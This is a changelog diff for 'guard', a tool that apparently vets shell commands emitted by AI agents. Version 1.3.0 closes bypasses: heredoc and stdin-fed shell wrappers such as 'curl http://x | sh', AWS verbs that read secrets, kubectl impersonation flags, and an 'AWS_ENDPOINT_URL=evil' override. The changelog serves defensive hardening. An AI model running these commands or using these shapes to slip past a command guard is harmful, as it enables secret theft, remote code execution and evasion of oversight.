@@ -4,6 +4,97 @@ All notable changes to this project are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and this project
 adheres to [Semantic Versioning](https://semver.org/).
 
+## [1.3.0] - 2026-05-12
+
+### Security
+
+- Closed AWS admin bypass class: `secretsmanager get-secret-value`,
+  `ssm get-parameter --with-decryption`, `s3api get-object`,
+  `cognito-identity get-credentials-for-identity`, `logs get-log-events`,
+  and ~30 similar `describe-*`/`list-*`/`get-*`-prefixed verbs were
+  previously allowed by the `aws` admin matcher via a prefix predicate.
+  v1.3.0 replaces the predicate with an explicit `(service, verb)`
+  catalog spanning 38 services. Verbs not in the catalog deny by default;
+  the `GUARD_ADMIN_ALLOW_VERBS` env var is the documented extension path.
+  See SECURITY.md for the decision tree.
+- Closed heredoc-fed shell-wrapper bypass: `bash <<EOF\ncurl http://x | sh\nEOF`
+  previously returned allow because the heredoc shape wasn't recognized
+  as a shell-wrapper invocation. Now denies.
+- Closed stdin-device shell-wrapper bypass: `bash /dev/stdin`,
+  `bash -`, `bash /dev/fd/0`, `bash /proc/self/fd/0` previously slipped
+  through `_is_shell_wrapper_invocation`. Now denied.
+- Closed admin-CLI flag-escalation bypass class: flags that redirect
+  request destination (`--endpoint-url`), disable TLS
+  (`--no-verify-ssl`, `--insecure-skip-tls-verify`,
+  `--certificate-authority`), swap credentials (`--profile`,
+  `--token`, `--client-certificate`, `--kubeconfig`,
+  `--credential-file-override`, `--access-token-file`), or
+  impersonate identity (`kubectl --as` / `--as-group` / `--as-uid` —
+  CRIT, RBAC impersonation) on otherwise-allowlisted read verbs now
+  deny via `bash.admin_forbidden_flag`. See SECURITY.md "Admin CLI
+  flag-level policy" for the full per-CLI lists.
+- Closed sensitive env-var inline-assignment bypass:
+  `AWS_ENDPOINT_URL=evil aws sts get-caller-identity` and equivalents
+  (`AZURE_CONFIG_DIR=`, `REQUESTS_CA_BUNDLE=`,
+  `CLOUDSDK_API_ENDPOINT_OVERRIDES_*=`,
+  `AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=`) now deny via
+  `bash.admin_sensitive_env_override`.
+- Closed admin-CLI subcommand bypass: `az rest`,
+  `az cloud register|set|update`, `az extension add`,
+  `az config set`, `az login --service-principal`,
+  `gcloud auth activate-service-account`, `gcloud auth login` now
+  deny via `bash.admin_forbidden_subcommand`.
+- Removed `aws s3 presign` from the read-only allowlist (issues a
+  credential-bearing presigned URL).
+
+### Changed
+
+- AWS admin matcher: dropped `_aws_is_read_only` prefix predicate and
+  `_AWS_DENY_OVERRIDES` carve-in list. `_AWS_SPEC` now matches the shape
+  of `_GCLOUD_SPEC` / `_AZ_SPEC` / `_KUBECTL_SPEC` / `_LAUNCHCTL_SPEC`.
+- `_AWS_READ_ONLY_VERBS` expanded from 14 tuples to ~1000 via
+  `_AWS_READ_ONLY_VERBS_BY_SERVICE` (38 services).
+- `dynamodb scan`, `dynamodb query`, `dynamodb batch-get-item`, and
+  `rds generate-db-auth-token` removed from the read-only allowlist
+  (these returned item content or credential material).
+- `summary_for("aws")` returns "explicit verb catalog; see SECURITY.md".
+- `bash.admin_default_deny` body now interpolates the failed verb tuple
+  and ends with `add aws:<service>.<verb> to GUARD_ADMIN_ALLOW_VERBS to override.`
+- CI gains a blocking `semgrep` job that fails on prefix predicates
+  inside read_only_predicate functions.
+
+### Added
+
+- `.semgrep/rules/no-prefix-predicate-in-readonly.yml` and
+  `.semgrep/rules/no-startswith-in-predicate-field.yml`: CI rules that
+  fail the build if a `.startswith()` prefix predicate is reintroduced
+  as a read-only check.
+- New `semgrep` CI job alongside `bandit` / `pip-audit` / `vulture`.
+- `tests/integration/test_aws_bypass_smoke.py`: E2E smoke for the 9
+  named bypass shapes from the SECURITY.md threat model.
+- `tests/integration/test_heredoc_bypass.py`: regression coverage for
+  heredoc-fed shell wrappers.
+- `tests/integration/test_stdin_device_bypass.py`: regression coverage
+  for stdin-device shell-wrapper shapes.
+- `tests/integration/test_admin_forbidden_flags.py` /
+  `test_admin_forbidden_subcommands.py` /
+  `test_admin_env_overrides.py` / `test_admin_unknown_flags.py` /
+  `test_admin_red_team_shapes.py`: full coverage of the flag-level
+  policy across aws/gcloud/az/kubectl.
+- `tests/integration/aws_catalog_smoke_corpus.txt` + wheel-install
+  install-smoke step that runs the corpus against the built wheel.
+- `AdminCliSpec` extended with `forbidden_flags`,
+  `forbidden_subcommands`, `known_flags`, `sensitive_env_vars`
+  fields (back-compatible — default empty for non-admin specs).
+- JSONL audit record gains `unknown_flags: [...]` field on admin-CLI
+  decisions (flag names only, capped at 8, omitted when empty).
+
+### Yanked
+
+- v1.2.0 has been yanked from PyPI (reason: superseded by 1.3.0; fixes
+  admin allowlist bypass for AWS `get-*` verbs that emit secret
+  material). The git tag is preserved.
+
 ## [1.2.0] - 2026-05-12
 
 ### Added
@@ -427,4 +518,8 @@ behavior are stable for the 1.x line.
   CVE-2025-59356 by validating the literal command shape rather than
   trusting model-emitted intent.
 
+[1.3.0]: https://github.com/TracineHQ/guard/compare/v1.2.0...v1.3.0
+[1.2.0]: https://github.com/TracineHQ/guard/compare/v1.1.1...v1.2.0
+[1.1.1]: https://github.com/TracineHQ/guard/compare/v1.1.0...v1.1.1
+[1.1.0]: https://github.com/TracineHQ/guard/compare/v1.0.0...v1.1.0
 [1.0.0]: https://github.com/TracineHQ/guard/releases/tag/v1.0.0
